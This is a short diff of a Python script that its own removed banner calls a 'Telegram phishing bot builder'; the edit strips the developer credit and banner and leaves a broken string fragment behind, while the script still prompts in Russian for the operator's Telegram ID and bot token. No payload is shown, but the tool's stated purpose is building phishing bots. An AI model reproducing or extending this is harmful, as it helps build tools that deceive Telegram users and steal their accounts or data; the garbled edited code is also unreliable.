@@ -1,4 +1,4 @@
-# Developer: @lamer112311
+
 
 import colorama
 from colorama import Fore, Back, Style
@@ -68,11 +68,7 @@ ______ _   _ _____ _____ _   _
 \_|   \_| |_/\___/\____/\_| |_/
 	''')
 
-print(Fore.GREEN + '#########################################')
-print(Fore.GREEN + '+' + Fore.BLUE + "     Telegram phishing bot builder     " + Fore.GREEN + '+')
-print(Fore.GREEN + '+' + Fore.BLUE + "       Developer: @lamer112311         " + Fore.GREEN + '+')
-print(Fore.GREEN + '+' + Fore.BLUE + "        Channel: @CyberPuffin         " + Fore.GREEN + '+')
-print(Fore.GREEN + '#########################################')
+         " + Fore.GREEN + '+')
 userid = input(Fore.YELLOW + "Введите свой Telegram ID > ")
 token = input(Fore.BLUE + "Введите токен бота > ")
 print(Fore.CYAN + '''
